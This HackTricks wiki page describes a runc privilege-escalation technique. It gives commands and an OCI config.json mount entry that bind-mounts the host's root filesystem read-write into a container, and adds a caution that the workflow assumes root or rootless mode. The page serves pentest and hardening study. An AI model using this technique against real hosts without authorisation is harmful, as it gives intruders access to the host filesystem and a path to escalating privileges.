---
title: "RunC Privilege Escalation"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/linux-hardening/containers-namespaces/runc-privilege-escalation.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: container
---

## Basic information

If you want to learn more about **runc** check the following page:

## PE

If `runc` is available to a rootful process on the host, you can use an OCI bundle whose mount configuration recursively bind-mounts the host’s `/` at `/` inside the container, exposing the host filesystem in that mount namespace.[\[1\]](#references)[\[2\]](#references)[\[3\]](#references)

```
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder
Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},
#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs
# Finally, start the container
# The root folder is the one from the host
runc run demo
```
Caution

The documented `runc run` workflow is rootful: runc’s own examples label it “run as root.” An unprivileged user needs a rootless configuration such as `runc spec --rootless`, and runc documents that user namespaces must be enabled for that mode.[\[1\]](#references)

## References

- [1] [runc: CLI tool for spawning and running containers](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
